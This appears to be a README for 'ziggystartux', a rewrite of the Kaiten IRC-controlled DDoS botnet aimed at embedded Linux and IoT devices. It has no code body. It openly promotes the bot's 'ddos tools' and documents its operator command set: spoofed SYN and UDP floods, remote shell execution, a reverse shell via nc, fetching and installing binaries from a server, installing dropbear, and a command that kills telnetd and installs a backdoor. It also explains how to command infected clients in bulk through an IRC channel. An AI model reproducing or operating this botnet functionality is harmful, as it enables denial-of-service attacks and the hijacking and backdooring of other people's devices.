# ziggystartux
A Kaiten rewrite, with much new functionality, and many fixes for the old stuff! Tailored toward embedded Linux devices, because... well, the internet of things of the new frontier!
<pre>
/*******************************************************************************
 *  oooooo  o                      .oPYo.  o             ooooo                 *
 *     d'                         8       8               8                    *
 *    d'  o8 .oPYo. .oPYo. o    o `Yooo. o8P.oPYo. oPYo.  8  o    o `o  o'     *
 *   d'    8 8    8 8    8 8    8     `8  8 .oooo8 8  `'  8  8    8  `bd'      *
 *  d'     8 8    8 8    8 8    8      8  8 8    8 8      8  8    8  d'`b      *
 * dooooo  8 `YooP8 `YooP8 `YooP8 `YooP'  8 `YooP8 8      8  `YooP' o'  `o     *
 *.......:..:....8 :....8 :....8 :.....::..:.....:..:::::..::.....:..:::..     *
 *::::::::::::ooP'.::ooP'.::ooP'.:::::::::::::::::::::::::::::::::::::::::     *
 *::::::::::::...::::...::::...:::::::::::::::::::::::::::::::::::::::::::     *
 ***************************************************************************** *                                                               
 * This is a remake of Kaiten, hacked together from various versions scattered *
 * throughout cyberspace. New features include a variety of awesome shell one- *
 * liners, ability to upgrade the bot over http (via gcc or static binary), a  *
 * feature called "HackPkg" that installs binaries without dependencies like   *
 * wget or tftp, and more! Tip: run GETBB <tftp ip> first to get the most out  *
 * of this bot (it will install to /var/bin, which is almost always writable). *
 * The LOCKUP command will kill telnetd and run a backdoor of your choice (for *
 * simplicity we assume you will run it on port 23). This bot is updated often,*
 * so check back frequently for new killer features and ddos tools. In memory  *
 * of David Bowie, because he was an awesome musician and passed during the    *
 * early development of this bot. By ShellzRuS and all the other developers    *
 * that have worked on Kaiten over the last 20 years.                          *
 *                                                                             *
 *        "Hacking on kaiten is a right of passage" --Kod                      *
 *******************************************************************************
 *   This is a IRC based distributed denial of service client.  It connects to *
 * the server specified below and accepts commands via the channel specified.  *
 * The syntax is:                                                              *
 *       !<nick> <command>                                                     *
 * You send this message to the channel that is defined later in this code.    *
 * Where <nick> is the nickname of the client (which can include wildcards)    *
 * and the command is the command that should be sent.  For example, if you    *
 * want to tell all the clients with the nickname starting with N, to send you *
 * the help message, you type in the channel:                                  *
 *       !N* HELP                                                              *
 * That will send you a list of all the commands.  You can also specify an     *
 * astrick alone to make all client do a specific command:                     *
 *       !* SH uname -a                                                        *
 * There are a number of commands that can be sent to the client:              *
 *       PAN <target> <port> <secs>    = A SYN flooder                         *
 *       UDP <target> <port> <secs>    = An UDP flooder                        *
 *       UNKNOWN <target> <secs>       = Another non-spoof udp flooder         *
 *       NICK <nick>                   = Changes the nick of the client        *
 *       SERVER <server>               = Changes servers                       *
 *       GETSPOOFS                     = Gets the current spoofing             *
 *       SPOOFS <subnet>               = Changes spoofing to a subnet          *
 *       DISABLE                       = Disables all packeting from this bot  *
 *       ENABLE                        = Enables all packeting from this bot   *
 *       KILL                          = Kills Ziggy                           *
 *       GET <http address> <save as>  = Downloads a file off the web          *
 *       VERSION                       = Requests version of bot               *
 *       KILLALL                       = Kills all current packeting           *
 *       HELP                          = Displays this                         *
 *       IRC <command>                 = Sends this command to the server      *
 *       SH <command>                  = Executes a command                    *
 *       ISH <command>                 = "Interactive" SH, send to channel     *
 *       BASH <command>                = Run a bash command                    *
 *       SHD <command>                 = Daemonize command                     *
 *       UPDATE <http://server/bot>    = Update this bot		       *
 *       HACKPKG <http://server/bin>   = Install binary (no dependencies)      *
 *       INSTALL <http://server/bin>   = Install binary (via wget)             *
 *       BINUPDATE <http://server/bin> = Update a binary (via wget)            *
 *       SCAN <nmap opts>              = Call an nmap wrapper script           *
 *       GETSSH <http:serverdropbear>  = Install dropbear, run on port 30022   *
 *       RSHELL <ip port>              = Equates to nohup nc ip port           *
 *       GETBB <tftp server>           = Get a proper busybox (via tftp)       *
 *       LOCKUP <http://server/bin>    = Kill telnet, install a backdoor!      *
 *       
 * Remember, all these commands must be prefixed by a ! and the nickname that  *
 * you want the command to be sent to (can include wildcards). There are no    *
 * spaces in between the ! and the nickname, and there are no spaces before    *
 * the !                                                                       *
 *                                                                             *
 *                               - contem on efnet                             *
 *******************************************************************************/
</pre>
